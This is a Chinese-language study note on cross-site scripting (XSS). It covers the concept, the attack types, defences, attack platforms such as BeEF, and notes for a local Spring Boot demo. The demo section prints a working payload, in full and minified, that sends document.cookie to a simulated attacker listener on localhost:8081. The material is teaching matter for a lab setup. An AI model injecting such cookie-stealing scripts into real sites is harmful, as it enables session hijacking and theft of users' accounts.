### XSS

#### 概念
跨站脚本攻击：英文全称是 `Cross-site scripting`，本来缩写是`CSS`，但是为了和层叠样式表(Cascading Style Sheets)有所区别，所以在安全领域叫`XSS`。

`XSS`攻击，通常指黑客通过"HTML注入"篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。
在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”，但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。
但是由于历史原因，XSS这个名字却一直保留下来。

#### 类型
1. 反射型XSS
1. 存储型XSS
1. DOM Based XSS
1. 通用型XSS ???
1. 突变型XSS ???

#### 反射型XSS
简单地把用户输入的数据“反射”给浏览器。也就是说，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。
也叫做“非持久型XSS”(Non-persistent XSS)。

#### 防御手段
1. waf
2. 侵入性组件

#### XSS攻击平台
1. Attack API
1. BeEF
1. XSS-Proxy
1. 终极武器：XSS Worm（用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起 `XSS Worm` 攻击。如站内信，用户留言等。而相对的，如果一个页面只能由用户个人看到，如“个人资料设置”，因为缺乏用户之间的交互功能，所以即使存在XSS，也不能被用于`XSS W  orm`的传播）

#### 示例注意点
1. 模拟生成登录cookie
    * 已存在不生成
    * 设置过期时间
    * 只针对controller开出去的接口做拦截，静态资源的访问不进行拦截（配置目录需要具体，不能配置`/static/**`）
1. 示例攻击性脚本
    * 仅仅弹框型
        ```js
        <script>alert('it is a xss test!')</script>
        ```
    * 向攻击者服务器发送请求
        ```js
        // 简单示例：AJAX请求只能发给同源的网址
        // 实际情况，攻击者监听服务器与被攻击服务器不会是同一台机器，因此监听服务需要开启
        // 为方便模拟，就不分别构件不同的代码模块，直接springboot示例同时开启8080和8081，并行启动两个示例。8080被攻击者，8081攻击者。
        <script>
         $.ajax({
            url: "http://localhost:8081/listener/log",
            type: "POST",
            dataType: "json",
            data: JSON.stringify({data: document.cookie}),
            processData: false,
            contentType: "application/json",
            success: function(arg) {
                console.log(arg);
                console.log("监听到数据");
            }
        });
        </script>
      
        压缩后的脚本：
        <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
        ```

#### 参考
1. 《白帽子讲Web安全》
1. [这一次，彻底理解XSS攻击](https://juejin.cn/post/6912030758404259854)
1. [关于XSS](https://juejin.cn/post/6844903926500704263)